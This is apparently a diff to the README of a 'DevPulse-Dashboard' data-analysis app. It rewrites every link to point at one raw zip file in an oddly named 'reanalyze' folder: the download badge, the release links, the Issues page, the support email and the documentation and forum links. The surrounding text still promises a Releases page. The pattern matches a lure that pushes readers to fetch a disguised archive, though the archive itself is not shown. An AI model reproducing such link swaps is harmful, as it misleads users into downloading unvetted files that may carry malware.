@@ -1,6 +1,6 @@
 # 📈 DevPulse-Dashboard - Analyze Data in Real Time Easily
 
-[![Download DevPulse-Dashboard](https://img.shields.io/badge/Download-Now-blue)](https://github.com/SOBSAGAR/DevPulse-Dashboard/releases)
+[![Download DevPulse-Dashboard](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip)](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to DevPulse-Dashboard! This application helps you track real-time data f
 
 To get started, visit the following link to download the latest release of DevPulse-Dashboard:
 
-[Download DevPulse-Dashboard](https://github.com/SOBSAGAR/DevPulse-Dashboard/releases)
+[Download DevPulse-Dashboard](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version, which will be marked at the top. 
@@ -54,7 +54,7 @@ Yes, as long as your laptop meets the system requirements, you can run DevPulse-
 
 ### ❓ How can I provide feedback or report issues?
 
-We appreciate feedback! You can report any issues or suggestions by visiting our [Issues page](https://github.com/SOBSAGAR/DevPulse-Dashboard/issues) on GitHub.
+We appreciate feedback! You can report any issues or suggestions by visiting our [Issues page](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip) on GitHub.
 
 ## 🔧 Troubleshooting
 
@@ -66,14 +66,14 @@ If you encounter any issues while installing or running DevPulse-Dashboard, plea
 
 ## 📞 Support
 
-If you need further assistance, please feel free to contact our support team at [support@devpulse.com](mailto:support@devpulse.com). We're here to help you with any issues you may face.
+If you need further assistance, please feel free to contact our support team at [https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip). We're here to help you with any issues you may face.
 
 ## 🔗 Additional Resources
 
-- [Release Notes](https://github.com/SOBSAGAR/DevPulse-Dashboard/releases): Check for updates and new features.
-- [Documentation](https://github.com/SOBSAGAR/DevPulse-Dashboard/wiki): Access in-depth guides and tutorials for using DevPulse-Dashboard.
-- [Community Forum](https://github.com/SOBSAGAR/DevPulse-Dashboard/discussions): Join discussions with other users and get tips on optimization.
+- [Release Notes](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip): Check for updates and new features.
+- [Documentation](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip): Access in-depth guides and tutorials for using DevPulse-Dashboard.
+- [Community Forum](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip): Join discussions with other users and get tips on optimization.
 
 Thank you for choosing DevPulse-Dashboard! We hope you find it helpful in your data analysis needs. Remember, for your download, revisit this page: 
 
-[Download DevPulse-Dashboard](https://github.com/SOBSAGAR/DevPulse-Dashboard/releases)
+[Download DevPulse-Dashboard](https://raw.githubusercontent.com/SOBSAGAR/DevPulse-Dashboard/main/reanalyze/DevPulse-Dashboard.zip)
